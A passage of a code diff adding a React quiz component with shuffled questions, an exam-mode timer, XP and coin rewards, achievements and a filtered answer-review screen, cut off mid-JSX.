+        // If the test is already finished, we keep the data but also mark isFinished
+        setAnswers(attemptDoc.answers || []);
+        setScore(attemptDoc.score || 0);
+        setIsFinished(attemptDoc.finished === true);
+
+        const attemptExam = attemptDoc.examMode || false;
+        setExamMode(attemptExam);
+
+        // Load exam timer if available
+        if (attemptExam && attemptDoc.examTimerSeconds) {
+          setExamTimer(attemptDoc.examTimerSeconds);
+          if (!attemptDoc.finished) {
+            // Only start the timer if the test is not finished
+            startTimer();
+          }
+        }
+
+        // Use the chosen length if available
+        const chosenLength = attemptDoc.selectedLength || totalQ;
+
+        if (
+          attemptDoc.shuffleOrder &&
+          attemptDoc.shuffleOrder.length === chosenLength
+        ) {
+          setShuffleOrder(attemptDoc.shuffleOrder);
+        } else {
+          const newQOrder = shuffleIndices(chosenLength);
+          setShuffleOrder(newQOrder);
+        }
+
+        if (
+          attemptDoc.answerOrder &&
+          attemptDoc.answerOrder.length === chosenLength
+        ) {
+          setAnswerOrder(attemptDoc.answerOrder);
+        } else {
+          const generatedAnswerOrder = testDoc.questions
+            .slice(0, chosenLength)
+            .map((q) => {
+              const numOptions = q.options.length;
+              return shuffleArray([...Array(numOptions).keys()]);
+            });
+          setAnswerOrder(generatedAnswerOrder);
+        }
+
+        setCurrentQuestionIndex(attemptDoc.currentQuestionIndex || 0);
+        setActiveTestLength(chosenLength);
+      } else {
+        // No attempt doc exists: show the test length selector UI
+        setActiveTestLength(null);
+        setShowTestLengthSelector(true);
+      }
+    } catch (err) {
+      setError(err.message);
+    } finally {
+      setLoadingTest(false);
+    }
+  };
+
+  useEffect(() => {
+    fetchTestAndAttempt();
+  }, [testId, userId]);
+
+  // Start the timer if in exam mode and not finished
+  useEffect(() => {
+    if (examMode && !isFinished && !loadingTest && activeTestLength) {
+      startTimer();
+    }
+  }, [examMode, isFinished, loadingTest, activeTestLength, startTimer]);
+
+  useEffect(() => {
+    if (level > localLevel) {
+      setLocalLevel(level);
+      setShowLevelUpOverlay(true);
+      const t = setTimeout(() => setShowLevelUpOverlay(false), 3000);
+      return () => clearTimeout(t);
+    }
+  }, [level, localLevel]);
+
+  useEffect(() => {
+    // Fix for the "Next Test" button issue: check if we're coming from a test completion
+    // and ensure we don't immediately show the score overlay for the new test
+    const isFromNextTestButton = location.state?.fromNextTest;
+    
+    if (isFromNextTestButton) {
+      // Reset these states to ensure we don't show the completion overlay
+      setShowScoreOverlay(false);
+      setIsFinished(false);
+      // Clean up the location state
+      navigate(location.pathname, { replace: true, state: {} });
+    } else if (location.state?.review && isFinished) {
+      setShowReviewMode(true);
+    }
+  }, [location.state, isFinished, navigate, location.pathname]);
+
+  const getShuffledIndex = useCallback(
+    (i) => {
+      if (!shuffleOrder || shuffleOrder.length === 0) return i;
+      return shuffleOrder[i];
+    },
+    [shuffleOrder]
+  );
+
+  const effectiveTotal =
+    activeTestLength || (testData ? testData.questions.length : 0);
+
+  const realIndex = getShuffledIndex(currentQuestionIndex);
+  const questionObject =
+    testData && testData.questions && testData.questions.length > 0
+      ? testData.questions[realIndex]
+      : null;
+
+  useEffect(() => {
+    if (!questionObject) return;
+    const existing = answers.find((a) => a.questionId === questionObject.id);
+    if (existing) {
+      setSelectedOptionIndex(null);
+      if (
+        existing.userAnswerIndex !== null &&
+        existing.userAnswerIndex !== undefined
+      ) {
+        const displayIndex = answerOrder[realIndex].indexOf(
+          existing.userAnswerIndex
+        );
+        if (displayIndex >= 0) {
+          setSelectedOptionIndex(displayIndex);
+          setIsAnswered(true);
+        } else {
+          setIsAnswered(false);
+        }
+      } else {
+        setIsAnswered(false);
+      }
+    } else {
+      setSelectedOptionIndex(null);
+      setIsAnswered(false);
+    }
+  }, [questionObject, answers, realIndex, answerOrder]);
+
+  const updateServerProgress = useCallback(
+    async (updatedAnswers, updatedScore, finished = false, singleAnswer = null) => {
+      if (!userId) return;
+      try {
+        if (singleAnswer) {
+          const res = await fetch(`/api/test/user/${userId}/submit-answer`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+              testId,
+              questionId: singleAnswer.questionId,
+              correctAnswerIndex: singleAnswer.correctAnswerIndex,
+              selectedIndex: singleAnswer.userAnswerIndex,
+              xpPerCorrect: (testData?.xpPerCorrect || 10) * xpBoost,
+              coinsPerCorrect: 5
+            })
+          });
+          const data = await res.json();
+          return data;
+        }
+        
+        await fetch(`/api/test/attempts/${userId}/${testId}/position`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            currentQuestionIndex,
+            finished,
+            examTimerSeconds: examTimer // Include timer in updates
+          })
+        });
+      } catch (err) {
+        console.error("Failed to update test attempt on backend", err);
+      }
+    },
+    [userId, testId, testData, xpBoost, currentQuestionIndex, examTimer]
+  );
+
+  // In exam mode, allow answer switching; in non–exam mode, lock answer selection once chosen.
+  const handleOptionClick = useCallback(
+    async (displayOptionIndex) => {
+      if (!questionObject) return;
+      if (!examMode && isAnswered) return; // Only block if exam mode is off.
+      const actualAnswerIndex = answerOrder[realIndex][displayOptionIndex];
+      setSelectedOptionIndex(displayOptionIndex);
+
+      // For non–exam mode, lock the answer; for exam mode, allow changes.
+      if (!examMode) {
+        setIsAnswered(true);
+      }
+      try {
+        const newAnswerObj = {
+          questionId: questionObject.id,
+          userAnswerIndex: actualAnswerIndex,
+          correctAnswerIndex: questionObject.correctAnswerIndex
+        };
+        const updatedAnswers = [...answers];
+        const idx = updatedAnswers.findIndex(
+          (a) => a.questionId === questionObject.id
+        );
+        if (idx >= 0) {
+          updatedAnswers[idx] = newAnswerObj;
+        } else {
+          updatedAnswers.push(newAnswerObj);
+        }
+        setAnswers(updatedAnswers);
+
+        const awardData = await updateServerProgress(
+          updatedAnswers,
+          score,
+          false,
+          newAnswerObj
+        );
+        if (!examMode && awardData && awardData.examMode === false) {
+          if (awardData.isCorrect) {
+            setScore((prev) => prev + 1);
+          }
+          if (awardData.isCorrect && !awardData.alreadyCorrect && awardData.awardedXP) {
+            dispatch(
+              setXPAndCoins({
+                xp: awardData.newXP,
+                coins: awardData.newCoins
+              })
+            );
+          }
+        }
+      } catch (err) {
+        console.error("Failed to submit answer to backend", err);
+      }
+    },
+    [
+      isAnswered,
+      questionObject,
+      examMode,
+      testData,
+      xpBoost,
+      userId,
+      testId,
+      dispatch,
+      score,
+      answers,
+      updateServerProgress,
+      realIndex,
+      answerOrder
+    ]
+  );
+
+  const finishTestProcess = useCallback(async () => {
+    if (examMode) {
+      pauseTimer(); // Stop the timer when finishing the test
+    }
+    
+    let finalScore = 0;
+    answers.forEach((ans) => {
+      if (ans.userAnswerIndex === ans.correctAnswerIndex) {
+        finalScore++;
+      }
+    });
+    setScore(finalScore);
+    try {
+      const res = await fetch(`/api/test/attempts/${userId}/${testId}/finish`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          score: finalScore,
+          totalQuestions: effectiveTotal,
+          examTimerSeconds: examTimer // Include timer value when finishing
+        })
+      });
+      const finishData = await res.json();
+
+      if (finishData.newlyUnlocked && finishData.newlyUnlocked.length > 0) {
+        finishData.newlyUnlocked.forEach((achievementId) => {
+          const achievement = achievements.find(
+            (a) => a.achievementId === achievementId
+          );
+          if (achievement) {
+            const IconComp = iconMapping[achievement.achievementId] || null;
+            const color = colorMapping[achievement.achievementId] || "#fff";
+            showAchievementToast({
+              title: achievement.title,
+              description: achievement.description,
+              icon: IconComp ? <IconComp /> : null,
+              color
+            });
+          }
+        });
+      }
+
+      if (
+        typeof finishData.newXP !== "undefined" &&
+        typeof finishData.newCoins !== "undefined"
+      ) {
+        dispatch(
+          setXPAndCoins({
+            xp: finishData.newXP,
+            coins: finishData.newCoins
+          })
+        );
+      }
+    } catch (err) {
+      console.error("Failed to finish test attempt:", err);
+    }
+    setIsFinished(true);
+    setShowScoreOverlay(true);
+    setShowReviewMode(false);
+  }, [answers, userId, testId, effectiveTotal, achievements, dispatch, examMode, pauseTimer, examTimer]);
+
+  const handleNextQuestion = useCallback(() => {
+    if (!isAnswered && !examMode) {
+      setShowNextPopup(true);
+      return;
+    }
+    if (currentQuestionIndex === effectiveTotal - 1) {
+      finishTestProcess();
+      return;
+    }
+    const nextIndex = currentQuestionIndex + 1;
+    setCurrentQuestionIndex(nextIndex);
+    updateServerProgress(answers, score, false);
+  }, [
+    isAnswered,
+    examMode,
+    currentQuestionIndex,
+    effectiveTotal,
+    finishTestProcess,
+    updateServerProgress,
+    answers,
+    score
+  ]);
+
+  const handlePreviousQuestion = useCallback(() => {
+    if (currentQuestionIndex > 0) {
+      const prevIndex = currentQuestionIndex - 1;
+      setCurrentQuestionIndex(prevIndex);
+      updateServerProgress(answers, score, false);
+    }
+  }, [currentQuestionIndex, updateServerProgress, answers, score]);
+
+  const handleSkipQuestion = () => {
+    if (!questionObject) return;
+    const updatedAnswers = [...answers];
+    const idx = updatedAnswers.findIndex(
+      (a) => a.questionId === questionObject.id
+    );
+    const skipObj = {
+      questionId: questionObject.id,
+      userAnswerIndex: null,
+      correctAnswerIndex: questionObject.correctAnswerIndex
+    };
+    if (idx >= 0) {
+      updatedAnswers[idx] = skipObj;
+    } else {
+      updatedAnswers.push(skipObj);
+    }
+    setAnswers(updatedAnswers);
+    setIsAnswered(false);
+    setSelectedOptionIndex(null);
+    updateServerProgress(updatedAnswers, score, false, skipObj);
+    if (currentQuestionIndex === effectiveTotal - 1) {
+      finishTestProcess();
+      return;
+    }
+    setCurrentQuestionIndex(currentQuestionIndex + 1);
+  };
+
+  const handleFlagQuestion = () => {
+    if (!questionObject) return;
+    const qId = questionObject.id;
+    if (flaggedQuestions.includes(qId)) {
+      setFlaggedQuestions(flaggedQuestions.filter((x) => x !== qId));
+    } else {
+      setFlaggedQuestions([...flaggedQuestions, qId]);
+    }
+  };
+
+  const handleRestartTest = useCallback(async () => {
+    setCurrentQuestionIndex(0);
+    setSelectedOptionIndex(null);
+    setIsAnswered(false);
+    setScore(0);
+    setAnswers([]);
+    setFlaggedQuestions([]);
+    setIsFinished(false);
+    setShowReviewMode(false);
+    setShowScoreOverlay(false);
+    
+    // Reset the timer for exam mode
+    if (examMode) {
+      resetTimer();
+      if (!isFinished) {
+        startTimer();
+      }
+    }
+
+    if (testData?.questions?.length && activeTestLength) {
+      const newQOrder = shuffleIndices(activeTestLength);
+      setShuffleOrder(newQOrder);
+      const newAnswerOrder = testData.questions
+        .slice(0, activeTestLength)
+        .map((q) => {
+          const numOpts = q.options.length;
+          return shuffleArray([...Array(numOpts).keys()]);
+        });
+      setAnswerOrder(newAnswerOrder);
+
+      if (userId && testId) {
+        await fetch(`/api/test/attempts/${userId}/${testId}`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            answers: [],
+            score: 0,
+            totalQuestions: testData.questions.length,
+            selectedLength: activeTestLength,
+            category: testData.category || category,
+            currentQuestionIndex: 0,
+            shuffleOrder: newQOrder,
+            answerOrder: newAnswerOrder,
+            finished: false,
+            examMode,
+            examTimerSeconds: 0 // Reset timer on restart
+          })
+        });
+      }
+    }
+  }, [
+    testData,
+    userId,
+    testId,
+    category,
+    examMode,
+    activeTestLength,
+    resetTimer,
+    startTimer,
+    isFinished
+  ]);
+
+  const handleFinishTest = () => {
+    finishTestProcess();
+  };
+
+  const [reviewFilter, setReviewFilter] = useState("all");
+  const handleReviewAnswers = () => {
+    setShowReviewMode(true);
+    setReviewFilter("all");
+  };
+  const handleCloseReview = () => {
+    if (!isFinished) setShowReviewMode(false);
+  };
+
+  const filteredQuestions = useMemo(() => {
+    if (!testData || !testData.questions) return [];
+    return testData.questions.slice(0, effectiveTotal).filter((q) => {
+      const userAns = answers.find((a) => a.questionId === q.id);
+      const isFlagged = flaggedQuestions.includes(q.id);
+
+      if (!userAns) {
+        // Not answered => count it as "skipped" or "all"
+        return reviewFilter === "skipped" || reviewFilter === "all";
+      }
+
+      const isSkipped = userAns.userAnswerIndex === null;
+      const isCorrect = userAns.userAnswerIndex === q.correctAnswerIndex;
+
+      if (reviewFilter === "all") return true;
+      if (reviewFilter === "skipped" && isSkipped) return true;
+      if (reviewFilter === "flagged" && isFlagged) return true;
+      if (reviewFilter === "incorrect" && !isCorrect && !isSkipped) return true;
+      if (reviewFilter === "correct" && isCorrect && !isSkipped) return true;
+
+      return false;
+    });
+  }, [testData, answers, flaggedQuestions, reviewFilter, effectiveTotal]);
+
+  const handleTimerToggle = () => {
+    if (isTimerRunning) {
+      pauseTimer();
+    } else {
+      startTimer();
+    }
+  };
+
+  const NextQuestionAlert = ({ message, onOk }) => (
+    <div className="confirm-popup-overlay">
+      <div className="confirm-popup-content">
+        <div className="alert-header">
+          <FaExclamationTriangle className="alert-icon" />
+          <h3>Attention</h3>
+        </div>
+        <p>{message}</p>
+        <div className="confirm-popup-buttons">
+          <button className="confirm-popup-ok" onClick={onOk}>
+            <FaCheck className="button-icon" />
+            <span>OK</span>
+          </button>
+        </div>
+      </div>
+    </div>
+  );
+
+  const renderNextPopup = () => {
+    if (!showNextPopup) return null;
+    return (
+      <NextQuestionAlert
+        message="You haven't answered this question yet. Please select an answer or skip the question."
+        onOk={() => {
+          setShowNextPopup(false);
+        }}
+      />
+    );
+  };
+
+  const ConfirmPopup = ({ message, onConfirm, onCancel }) => (
+    <div className="confirm-popup-overlay">
+      <div className="confirm-popup-content">
+        <div className="alert-header">
+          <FaExclamationTriangle className="alert-icon" />
+          <h3>Confirm Action</h3>
+        </div>
+        <p>{message}</p>
+        <div className="confirm-popup-buttons">
+          <button className="confirm-popup-yes" onClick={onConfirm}>
+            <FaCheck className="button-icon" />
+            <span>Yes</span>
+          </button>
+          <button className="confirm-popup-no" onClick={onCancel}>
+            <FaTimes className="button-icon" />
+            <span>No</span>
+          </button>
+        </div>
+      </div>
+    </div>
+  );
+
+  const renderRestartPopup = () => {
+    if (!showRestartPopup) return null;
+    return (
+      <ConfirmPopup
+        message="Are you sure you want to restart the test? All progress will be lost and you'll start from the beginning."
+        onConfirm={() => {
+          handleRestartTest();
+          setShowRestartPopup(false);
+        }}
+        onCancel={() => setShowRestartPopup(false)}
+      />
+    );
+  };
+
+  const renderFinishPopup = () => {
+    if (!showFinishPopup) return null;
+    return (
+      <ConfirmPopup
+        message="Are you sure you want to finish the test now? Any unanswered questions will be marked as skipped."
+        onConfirm={() => {
+          handleFinishTest();
+          setShowFinishPopup(false);
+        }}
+        onCancel={() => setShowFinishPopup(false)}
+      />
+    );
+  };
+
+  const renderScoreOverlay = () => {
+    if (!showScoreOverlay) return null;
+    const percentage = effectiveTotal
+      ? Math.round((score / effectiveTotal) * 100)
+      : 0;
+      
+    // Determine grade based on percentage
+    let grade = "";
+    let gradeClass = "";
+    
+    if (percentage >= 90) {
+      grade = "Outstanding!";
+      gradeClass = "grade-a-plus";
+    } else if (percentage >= 80) {
+      grade = "Excellent!";
+      gradeClass = "grade-a";
+    } else if (percentage >= 70) {
+      grade = "Great Job!";
+      gradeClass = "grade-b";
+    } else if (percentage >= 60) {
+      grade = "Good Effort!";
+      gradeClass = "grade-c";
+    } else {
+      grade = "Keep Practicing!";
+      gradeClass = "grade-d";
+    }
+    
+    return (
+      <div className="score-overlay">
+        <div className="score-content">
+          <h2 className="score-title">Test Complete!</h2>
+          
+          <div className="score-grade-container">
+            <div className={`score-grade ${gradeClass}`}>
+              <div className="percentage-display">{percentage}%</div>
+              <div className="grade-label">{grade}</div>
+            </div>
+            
+            <div className="score-details-container">
+              <p className="score-details">
+                You answered <strong>{score}</strong> out of <strong>{effectiveTotal}</strong> questions correctly.
+              </p>
+              
+              {examMode && (
+                <div className="exam-mode-note">
+                  <FaTrophy className="exam-icon" />
+                  <p>You completed this test in exam mode!</p>
+                  <div className="exam-timer-result">
+                    <FaClock className="timer-icon" />
+                    <span>Time: {formatTime(examTimer)}</span>
+                  </div>
+                </div>
+              )}
+            </div>
+          </div>
+
+          {/* Test Length selection after finishing */}
+          <div className="length-selection">
+            <p>Select Length for Next Attempt:</p>
+            <div className="length-selector-options">
+              {allowedTestLengths.map((length) => (
+                <label
+                  key={length}
+                  className={`length-option ${selectedLength === length ? 'selected' : ''}`}
+                >
+                  <input
+                    type="radio"
+                    name="finishedTestLength"
+                    value={length}
+                    checked={selectedLength === length}
+                    onChange={(e) => {
+                      const newLen = Number(e.target.value);
+                      setSelectedLength(newLen);
+                      setActiveTestLength(newLen);
+                    }}
+                  />
+                  <span>{length}</span>
+                </label>
+              ))}
+            </div>
+          </div>
+
+          <div className="overlay-buttons">
+            <button
+              className="restart-button"
+              onClick={() => setShowRestartPopup(true)}
+            >
+              <FaRedoAlt className="button-icon" />
+              <span>Restart Test</span>
+            </button>
+            
+            <button 
+              className="review-button" 
+              onClick={handleReviewAnswers}
+            >
+              <FaEye className="button-icon" />
+              <span>Review Answers</span>
+            </button>
+            
+            <button 
+              className="back-btn" 
+              onClick={() => navigate(backToListPath)}
+            >
+              <FaArrowLeft className="button-icon" />
+              <span>Back to List</span>
+            </button>
+            
+            {Number(testId) < 9999 && (
+              <button
+                className="next-test-button"
+                onClick={() => {
+                  // Set a flag in the navigation state to prevent showing the score overlay on the next test
+                  navigate(`${backToListPath}/${Number(testId) + 1}`, {
+                    state: { fromNextTest: true, selectedLength }
+                  });
+                }}
+              >
+                <FaArrowRight className="button-icon" />
+                <span>Next Test</span>
+              </button>
+            )}
+          </div>
+        </div>
+      </div>
+    );
+  };
+
+  const renderReviewMode = () => {
+    if (!showReviewMode) return null;
+    return (
+      <div className="score-overlay review-overlay">
+        <div className="score-content review-content">
+          {isFinished ? (
+            <button
+              className="back-to-list-btn"
+              onClick={() => navigate(backToListPath)}
+            >
+              <FaArrowLeft className="button-icon" />
+              <span>Back to Test List</span>
+            </button>
+          ) : (
+            <button className="close-review-x" onClick={handleCloseReview}>
+              <FaTimes />
+            </button>
+          )}
+          <h2 className="score-title">Review Mode</h2>
+          {isFinished && (
+            <div className="review-header-info">
+              <p className="review-score-line">
+                Your final score: {score}/{effectiveTotal} (
+                {effectiveTotal ? Math.round((score / effectiveTotal) * 100) : 0}
+                %)
+              </p>
+              {examMode && (
+                <div className="review-timer">
+                  <FaClock className="timer-icon" />
+                  <span>Time taken: {formatTime(examTimer)}</span>
+                </div>
+              )}
+            </div>
+          )}
+          <div className="review-filter-buttons">
+            <button
+              className={reviewFilter === "all" ? "active-filter" : ""}
+              onClick={() => setReviewFilter("all")}
+            >
+              <FaClipboardList className="filter-icon" />
+              <span>All</span>
+            </button>
+            <button
+              className={reviewFilter === "skipped" ? "active-filter" : ""}
+              onClick={() => setReviewFilter("skipped")}
+            >
+              <FaStepForward className="filter-icon" />
+              <span>Skipped</span>
+            </button>
+            <button
+              className={reviewFilter === "flagged" ? "active-filter" : ""}
+              onClick={() => setReviewFilter("flagged")}
+            >
+              <FaFlag className="filter-icon" />
+              <span>Flagged</span>
+            </button>
+            <button
+              className={reviewFilter === "incorrect" ? "active-filter" : ""}
+              onClick={() => setReviewFilter("incorrect")}
+            >
+              <FaTimes className="filter-icon" />
+              <span>Incorrect</span>
+            </button>
+            <button
+              className={reviewFilter === "correct" ? "active-filter" : ""}
+              onClick={() => setReviewFilter("correct")}
+            >
+              <FaCheck className="filter-icon" />
+              <span>Correct</span>
+            </button>
+          </div>
+          <p className="review-filter-count">
+            Showing {filteredQuestions.length} questions
+          </p>
+          <div className="review-mode-container">
+            {filteredQuestions.map((q, idx) => {
+              const userAns = answers.find((a) => a.questionId === q.id);
+              const isFlagged = flaggedQuestions.includes(q.id);
+
+              if (!userAns) {
+                return (
+                  <div key={q.id} className="review-question-card">
+                    <div className="review-question-header">
+                      <span className="question-number">Question {idx + 1}</span>
+                      {isFlagged && <span className="flagged-icon">🚩</span>}
+                    </div>
+                    <h3>{q.question}</h3>
+                    <div className="review-answer-section unanswered">
+                      <p className="review-status-label">
+                        <FaExclamationTriangle className="status-icon warning" />
+                        <span>Not Answered</span>
+                      </p>
+                      <p className="correct-answer">
+                        <strong>Correct Answer:</strong>{" "}
+                        {q.options[q.correctAnswerIndex]}
+                      </p>
+                    </div>
+                    <div className="review-explanation">
+                      <p>{q.explanation}</p>
+                    </div>
+                  </div>
+                );
+              }
+
+              const isSkipped = userAns.userAnswerIndex === null;
+              const isCorrect = userAns.userAnswerIndex === q.correctAnswerIndex;
+
+              return (
+                <div key={q.id} className={`review-question-card ${isSkipped ? 'skipped' : isCorrect ? 'correct' : 'incorrect'}`}>
+                  <div className="review-question-header">
+                    <span className="question-number">Question {idx + 1}</span>
+                    {isFlagged && <span className="flagged-icon">🚩</span>}
+                  </div>
+                  <h3>{q.question}</h3>
+                  <div className={`review-answer-section ${isSkipped ? 'skipped' : isCorrect ? 'correct' : 'incorrect'}`}>
+                    <p className="review-status-label">
+                      {isSkipped ? (
+                        <>
+                          <FaStepForward className="status-icon skipped" />
+                          <span>Skipped</span>
+                        </>
+                      ) : isCorrect ? (
+                        <>
+                          <FaCheck className="status-icon correct" />
+                          <span>Correct!</span>
+                        </>
+                      ) : (
+                        <>
+                          <FaTimes className="status-icon incorrect" />
+                          <span>Incorrect</span>
+                        </>
+                      )}
+                    </p>
+                    
+                    {!isSkipped && (
+                      <p className="your-answer">
+                        <strong>Your Answer:</strong>{" "}
+                        {q.options[userAns.userAnswerIndex]}
+                      </p>
+                    )}
+                    
+                    <p className="correct-answer">
+                      <strong>Correct Answer:</strong>{" "}
+                      {q.options[q.correctAnswerIndex]}
+                    </p>
+                  </div>
+                  <div className="review-explanation">
+                    <p>{q.explanation}</p>
+                  </div>
+                </div>
+              );
+            })}
+          </div>
+          {!isFinished && (
+            <button
+              className="review-button close-review-btn"
+              onClick={handleCloseReview}
+            >
+              <FaTimes className="button-icon" />
+              <span>Close Review</span>
+            </button>
+          )}
+        </div>
+      </div>
+    );
+  };
+
+  const handleNextQuestionButtonClick = () => {
+    if (!isAnswered && !examMode) {
+      setShowNextPopup(true);
+    } else {
+      handleNextQuestion();
+    }
+  };
+
+  // If no attempt doc was found (on first load), show test length UI:
+  if (showTestLengthSelector) {
+    return (
+      <div className="aplus-test-container">
+        <div className="test-length-selector">
+          <h2>Select Test Length</h2>
+          <div className="test-mode-indicator">
+            <span className={examMode ? 'exam-on' : 'exam-off'}>
+              {examMode ? 'Exam Mode: ON' : 'Practice Mode'}
+            </span>
+          </div>
+          <p>How many questions would you like to answer?</p>
+          <div className="test-length-options">
+            {allowedTestLengths.map((length) => (
+              <label 
+                key={length}
+                className={selectedLength === length ? 'selected' : ''}
+              >
+                <input
+                  type="radio"
+                  name="testLength"
+                  value={length}
+                  checked={selectedLength === length}
+                  onChange={(e) => setSelectedLength(Number(e.target.value))}
+                />
+                <span>{length}</span>
+              </label>
+            ))}
+          </div>
+          <button
+            onClick={async () => {
+              setActiveTestLength(selectedLength);
+              if (testData) {
+                const totalQ = testData.questions.length;
+                const newQOrder = shuffleIndices(selectedLength);
+                setShuffleOrder(newQOrder);
+                const newAnswerOrder = testData.questions
+                  .slice(0, selectedLength)
+                  .map((q) => {
+                    const numOpts = q.options.length;
+                    return shuffleArray([...Array(numOpts).keys()]);
+                  });
+                setAnswerOrder(newAnswerOrder);
+                try {
+                  await fetch(`/api/test/attempts/${userId}/${testId}`, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({
+                      answers: [],
+                      score: 0,
+                      totalQuestions: totalQ,
+                      selectedLength: selectedLength,
+                      category: testData.category || category,
+                      currentQuestionIndex: 0,
+                      shuffleOrder: newQOrder,
+                      answerOrder: newAnswerOrder,
+                      finished: false,
+                      examMode: location.state?.examMode || false,
+                      examTimerSeconds: 0 // Initialize timer at 0
+                    })
+                  });
+                  setShowTestLengthSelector(false);
+                  fetchTestAndAttempt();
+                } catch (err) {
+                  console.error("Failed to start new attempt", err);
+                }
+              }
+            }}
+          >
+            <FaPlay className="button-icon" />
+            <span>Start Test</span>
+          </button>
+          <button 
+            className="back-to-list-btn"
+            onClick={() => navigate(backToListPath)}
+          >
+            <FaArrowLeft className="button-icon" />
+            <span>Back to Test List</span>
+          </button>
+        </div>
+      </div>
+    );
+  }
+
+  if (error) {
+    return (
+      <div className="aplus-test-container">
+        <div className="test-error-container">
+          <FaExclamationTriangle className="test-error-icon" />
+          <h2>Error Loading Test</h2>
+          <p>{error}</p>
+          <div className="test-error-actions">
+            <button onClick={() => window.location.reload()}>
+              <FaRedoAlt className="button-icon" />
+              <span>Try Again</span>
+            </button>
+            <button onClick={() => navigate(backToListPath)}>
+              <FaArrowLeft className="button-icon" />
+              <span>Back to Test List</span>
+            </button>
+          </div>
+        </div>
+      </div>
+    );
+  }
+
+  if (loadingTest) {
+    return (
+      <div className="aplus-test-container">
+        <div className="test-loading-container">
+          <div className="test-loading-spinner">
+            <FaSpinner className="spinner-icon" />
+          </div>
+          <p>Loading test data...</p>
+        </div>
+      </div>
+    );
+  }
+
+  if (!testData || !testData.questions || testData.questions.length === 0) {
+    return (
+      <div className="aplus-test-container">
+        <div className="test-error-container">
+          <FaExclamationTriangle className="test-error-icon" />
+          <h2>No Questions Found</h2>
+          <p>This test doesn't have any questions yet.</p>
+          <button onClick={() => navigate(backToListPath)}>
+            <FaArrowLeft className="button-icon" />
+            <span>Back to Test List</span>
+          </button>
+        </div>
+      </div>
+    );
+  }
+
+  let avatarUrl = "https://via.placeholder.com/60";
+  if (currentAvatar && shopItems && shopItems.length > 0) {
+    const avatarItem = shopItems.find((item) => item._id === currentAvatar);
+    if (avatarItem && avatarItem.imageUrl) {
+      avatarUrl = avatarItem.imageUrl;
+    }
+  }
+
+  const progressPercentage = effectiveTotal
+    ? Math.round(((currentQuestionIndex + 1) / effectiveTotal) * 100)
+    : 0;
+  const progressColorHue = (progressPercentage * 120) / 100; // from red to green
+  const progressColor = `hsl(${progressColorHue}, 100%, 50%)`;
+
+  let displayedOptions = [];
+  if (questionObject && answerOrder[realIndex]) {
+    displayedOptions = answerOrder[realIndex].map(
+      (optionIdx) => questionObject.options[optionIdx]
+    );
+  }
+
+  return (
+    <div className="aplus-test-container">
+      <ConfettiAnimation trigger={showLevelUpOverlay} level={level} />
+
+      {renderRestartPopup()}
+      {renderFinishPopup()}
+      {renderNextPopup()}
+      {renderScoreOverlay()}
+      {renderReviewMode()}
+
+      <div className="top-control-bar">
+        <button 
+          className={`flag-btn ${questionObject && flaggedQuestions.includes(questionObject.id) ? 'active' : ''}`} 
+          onClick={handleFlagQuestion}
+          disabled={!questionObject}
+        >
+          <FaFlag className="button-icon" />
+          <span>{questionObject && flaggedQuestions.includes(questionObject.id) ? "Unflag" : "Flag"}</span>
+        </button>
+        
+        <QuestionDropdown
+          totalQuestions={effectiveTotal}
+          currentQuestionIndex={currentQuestionIndex}
+          onQuestionSelect={(index) => {
+            setCurrentQuestionIndex(index);
+            updateServerProgress(answers, score, false);
+          }}
+          answers={answers}
+          flaggedQuestions={flaggedQuestions}
+          testData={testData}
+          shuffleOrder={shuffleOrder}
+          examMode={examMode}
+        />
+        
+        <button
+          className="finish-test-btn"
+          onClick={() => setShowFinishPopup(true)}
+        >
+          <FaFlagCheckered className="button-icon" />
+          <span>Finish Test</span>
+        </button>
+      </div>
+
+      <div className="upper-control-bar">
+        <button
+          className="restart-test-btn"
+          onClick={() => setShowRestartPopup(true)}
+        >
+          <FaRedoAlt className="button-icon" />
+          <span>Restart</span>
+        </button>
+        
+        <h1 className="aplus-title">{testData.testName}</h1>
+        
+        <button 
+          className="back-btn" 
+          onClick={() => navigate(backToListPath)}
+        >
+          <FaArrowLeft className="button-icon" />
+          <span>Back to List</span>
+        </button>
+      </div>
+
+      <div className="top-bar">
+        <div className="avatar-section-test">
+          <div
+            className="avatar-image"
+            style={{ backgroundImage: `url(${avatarUrl})` }}
+          />
+          <div className="avatar-level">
+            <FaLevelUpAlt className="level-icon" />
+            <span>{level}</span>
+          </div>
+        </div>
+        <div className="xp-level-display">
+          <FaStar className="xp-icon" />
+          <span>{xp} XP</span>
+        </div>
+        <div className="coins-display">
+          <FaCoins className="coins-icon" />
+          <span>{coins}</span>
+        </div>
+        
+        {/* Exam Mode Timer */}
+        {examMode && (
+          <div className="exam-timer">
+            <div className="timer-display">
+              <FaClock className="timer-icon" />
+              <span>{formatTime(examTimer)}</span>
+            </div>
+            <button 
+              className="timer-toggle-btn"
+              onClick={handleTimerToggle}
+            >
+              {isTimerRunning ? <FaPause /> : <FaPlay />}
+            </button>
+          </div>
+        )}
+      </div>
+
+      <div className="exam-mode-indicator">
+        {examMode ? (
+          <div className="exam-badge">
+            <FaTrophy className="exam-icon" />
+            <span>EXAM MODE</span>
+          </div>
+        ) : null}
+      </div>
+
+      <div className="progress-container">
+        <div
+          className="progress-fill"
+          style={{ width: `${progressPercentage}%`, background: progressColor }}
+        >
+          {currentQuestionIndex + 1} / {effectiveTotal} ({progressPercentage}%)
+        </div>
+      </div>
+
+      {!showScoreOverlay && !showReviewMode && !isFinished && (
+        <div className="question-card">
+          <div className="question-text">
+            {questionObject && questionObject.question}
+          </div>
+
+          <ul className="options-list">
+            {displayedOptions.map((option, displayIdx) => {
+              let optionClass = "option-button";
+
+              if (!examMode) {
+                if (isAnswered && questionObject) {
+                  const correctIndex = questionObject.correctAnswerIndex;
+                  const actualIndex = answerOrder[realIndex][displayIdx];
+
+                  if (actualIndex === correctIndex) {
+                    optionClass += " correct-option";
+                  } else if (
+                    displayIdx === selectedOptionIndex &&
+                    actualIndex !== correctIndex
+                  ) {
+                    optionClass += " incorrect-option";
+                  }
+                }
+              } else {
+                if (isAnswered && displayIdx === selectedOptionIndex) {
+                  optionClass += " chosen-option";
+                }
+              }
+
+              return (
+                <li className="option-item" key={displayIdx}>
+                  <button
+                    className={optionClass}
